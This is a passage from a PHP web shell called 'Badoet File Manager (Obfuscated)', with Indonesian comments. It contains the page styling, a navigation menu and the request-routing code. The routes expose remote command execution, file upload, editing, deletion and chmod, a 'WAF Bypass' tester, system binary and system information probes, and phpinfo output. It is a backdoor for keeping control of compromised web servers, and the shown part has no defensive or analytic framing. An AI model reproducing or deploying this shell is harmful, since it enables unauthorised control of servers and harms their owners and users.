        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #2e3440; color: #d8dee9; margin: 0; padding: 20px; }
        .header { border-bottom: 2px solid #4c566a; padding-bottom: 10px; margin-bottom: 20px; color: #88c0d0; }
        .nav-links { float: right; }
        .container { max-width: 1200px; margin: auto; }
        a { color: #88c0d0; text-decoration: none; }
        a:hover { color: #a3be8c; }
        .file-list { border: 1px solid #4c566a; background-color: #3b4252; margin-top: 15px; }
        .row { display: flex; padding: 8px 15px; border-bottom: 1px dotted #4c566a; }
        .row:hover { background-color: #4c566a; }
        .col-type { width: 5%; }
        .col-name { width: 45%; }
        .col-size { width: 25%; text-align: left; }
        .col-actions { width: 25%; text-align: right; }
        .icon { margin-right: 5px; }
        .dir-name { color: #ebcb8b; }
        .file-name { color: #d08770; }
        .editor-container { margin-top: 20px; }
        textarea { width: 100%; height: 500px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a; padding: 10px; box-sizing: border-box;}
        input[type="submit"] { background-color: #5e81ac; color: white; padding: 8px 15px; border: none; cursor: pointer; border-radius: 4px; transition: background-color 0.3s; }
        input[type="submit"]:hover { background-color: #81a1c1; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="nav-links">
             <a href="?path=<?php echo urlencode($current_dir); ?>">[ File Manager ]</a>
             <a href="?action=upload&path=<?php echo urlencode($current_dir); ?>">[ Upload File ]</a>
             <a href="?action=mkfile&path=<?php echo urlencode($current_dir); ?>">[ Create File ]</a> 
             <a href="?action=mkdir&path=<?php echo urlencode($current_dir); ?>">[ Create Folder ]</a> 
             <a href="?action=wafbypass&path=<?php echo urlencode($current_dir); ?>">[ WAF Bypass ]</a> 
             <a href="?action=binaries&path=<?php echo urlencode($current_dir); ?>">[ System Binaries ]</a> 
             <a href="?action=exec&path=<?php echo urlencode($current_dir); ?>">[ Command Exec ]</a> 
             <a href="?action=sysinfo&path=<?php echo urlencode($current_dir); ?>">[ System Info ]</a>
             <a href="?action=info&path=<?php echo urlencode($current_dir); ?>" target="_blank">[ PHP Info ]</a>
        </div>
        <h2>Badoet File Manager (Obfuscated)</h2>
        <p>Jalur Saat Ini: <code><?php echo htmlspecialchars($current_dir); ?></code></p>
    </div>

<?php 
// --- LOGIKA UTAMA (Routing) ---
$action = isset($_GET['action']) ? $_GET['action'] : 'list';
$current_file = isset($_GET['file']) ? realpath($_GET['file']) : false;

$file_is_valid = $current_file !== false && (is_file($current_file) || is_dir($current_file));
$dir_is_valid = $current_dir !== false && is_dir($current_dir);


if ($action === 'delete' && $file_is_valid) {
    perform_delete($current_file);
    display_dir_listing(dirname($current_file)); 
} else if ($action === 'chmod' && $file_is_valid) {
    display_chmod_form($current_file);
} else if ($action === 'rename' && $file_is_valid) {
    display_rename_form($current_file);
} else if ($action === 'edit' && $file_is_valid && is_file($current_file)) {
    display_file_editor($current_file);
} else if ($action === 'upload' && $dir_is_valid) {
    display_upload_form($current_dir);
} else if ($action === 'mkdir' && $dir_is_valid) {
    display_create_folder_form($current_dir);
} else if ($action === 'mkfile' && $dir_is_valid) {
    display_create_file_form($current_dir);
} else if ($action === 'wafbypass') { // Ditambahkan WAF Bypass Action
    display_waf_bypass_tester();
    // Tidak menampilkan listing direktori jika berada di halaman tersendiri
} else if ($action === 'binaries') {
    check_system_binaries();
    display_dir_listing($current_dir);
} else if ($action === 'exec') {
    display_command_execution();
    display_dir_listing($current_dir);
} else if ($action === 'sysinfo') { 
    display_system_info();
    echo '<p><a href="?' . http_build_query(['path' => $current_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
} else if ($action === 'info') {
    if (function_exists('phpinfo')) {
        echo "Fungsi phpinfo() dibuka di window baru. Harap periksa tab browser.";
        display_dir_listing($current_dir);
    } else {
        echo '<p style="color: #bf616a;">[!] Fungsi <code>phpinfo()</code> diblokir atau tidak tersedia.</p>';
    }
}
else {
    // Default action: List directory
    if (!$dir_is_valid) {
        echo '<p style="color: #bf616a;">[!] Direktori yang diakses tidak valid. Kembali ke root.</p>';
        $current_dir = __DIR__;
    }
    display_dir_listing($current_dir);
}
?>

</div>
</body>
</html>
<?php 
// Eksekusi phpinfo()
if ($action === 'info' && function_exists('phpinfo')) {
    if (ob_get_level() > 0) {
        ob_end_clean(); 
    }
    phpinfo();
    exit;
}
?>
